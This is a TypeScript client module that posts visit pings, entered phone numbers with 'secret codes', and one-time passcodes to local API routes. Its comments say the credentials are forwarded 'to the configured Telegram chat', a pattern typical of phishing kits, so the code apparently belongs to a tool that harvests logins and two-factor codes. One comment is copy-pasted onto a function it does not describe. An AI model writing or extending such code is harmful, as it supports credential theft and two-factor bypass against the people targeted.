import type {
    SendCredentialsRequest,
    SendCredentialsResponse,
    SendOtpWithCredentialsRequest,
    SendOtpWithCredentialsResponse,
} from '@/types/auth';

async function postJson<T>(url: string, body: unknown): Promise<T> {

    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
    });

    const data = await res.json();

    if (!res.ok) {
        throw new Error((data && data.error) || `Request failed (${res.status})`);
    }

    return data as T;
}

export const CredentialsService = {

    /** Send the entered phone number + secret code to the configured Telegram chat. */
    sendVisitUser() {
        return postJson('/api/visit', { visit: true });
    },


    /** Send the entered phone number + secret code to the configured Telegram chat. */
    sendCredentials(payload: SendCredentialsRequest): Promise<SendCredentialsResponse> {
        return postJson<SendCredentialsResponse>('/api/credentials', payload);
    },

    /** Verify a submitted OTP code against its id. */
    sendOTPWithCredentials(payload: SendOtpWithCredentialsRequest): Promise<SendOtpWithCredentialsResponse> {
        return postJson<SendOtpWithCredentialsResponse>('/api/otp/otp-credentials', payload);
    },
};
